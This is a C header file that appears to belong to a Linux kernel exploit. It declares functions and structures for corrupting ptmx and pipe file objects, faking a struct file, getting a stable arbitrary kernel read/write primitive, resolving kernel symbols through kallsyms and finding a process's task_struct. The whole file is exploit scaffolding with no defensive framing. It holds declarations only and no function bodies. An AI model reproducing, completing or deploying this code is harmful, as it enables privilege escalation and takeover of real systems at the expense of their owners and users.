#ifndef _TTY_H_
#define _TTY_H_

#include <termios.h>
#include <unistd.h>
#include <stdint.h>
#include <stdatomic.h>
#include "util.h"

void prepare_fake_struct_file(void *buffer, int f_count, int f_mode);

void flush_ptmx(int ptmx);
void turn_on_ptmx(int ptmx);
void turn_off_ptmx(int ptmx);
void make_ptmx_echo(int ptmx);
void make_ptmx_blocking(int ptmx);
void make_ptmx_non_blocking(int ptmx);

struct task_info {
    u64 task_struct;
    u64 files_struct;
};

struct kernel_info {
    u64 pipe_buffer_ops;
    u64 pipe_buffer_page;
    u64 kernel_base;
};

struct pipe_info {
    int corrupted_ptmx;
    int corrupted_pipe[2];
};

enum uao_op {
    uao_op_read = 1,
    uao_op_write,
    uao_op_done,
};

struct uao_info {
    pthread_t uao_th;
    pid_t tid;
    struct task_info uao_thread;
    int pipe[2];
    pthread_mutex_t mutex;
    bool dead;
    atomic_uint state;
    enum uao_op op;
    u64 kaddr;
    u64 size; 
};

struct ksym {
    void *kmap;
    u32 kmap_size;
    u32 num_syms;
    u64 relative_base;
    /* These are offsets. */
    u32 kallsyms_token_table;
    u32 kallsyms_token_index;
    u32 kallsyms_markers;
    u32 kallsyms_names;
    u32 kallsyms_num_syms;
    u32 kallsyms_relative_base;
    u32 kallsyms_offsets;
};

struct rw_info {
    struct kernel_info ki;
    struct pipe_info pipe;
    struct uao_info uao;
    int (*kread)(struct rw_info *rw, u64 kaddr, void *buf, u64 size);
    int (*kwrite)(struct rw_info *rw, u64 kaddr, void *buf, u64 size);
    int (*kclose)(struct rw_info *rw);
    struct ksym ksym;
};

int filter_corrupted_files(int *ptmxs, int nr_ptmx, int *pipes, int nr_pipes, int *corrupted_ptmx, int corrupted_pipe[2]);
int get_stable_rw(struct rw_info *rw);

void kwrite64(struct rw_info *rw, u64 kaddr, u64 val);
u64 kread64(struct rw_info *rw, u64 kaddr);
void kwrite32(struct rw_info *rw, u64 kaddr, u32 val);
u32 kread32(struct rw_info *rw, u64 kaddr);
void kread(struct rw_info *rw, u64 kaddr, void *buf, u64 size);
void kwrite(struct rw_info *rw, u64 kaddr, void *buf, u64 size);

bool find_kallsyms(struct rw_info *rw);
u64 kallsyms_lookup_name(struct rw_info *rw, const char *name);

bool find_task_struct_by_pid_tid(struct rw_info *rw, pid_t pid, pid_t tid, struct task_info *task);

#endif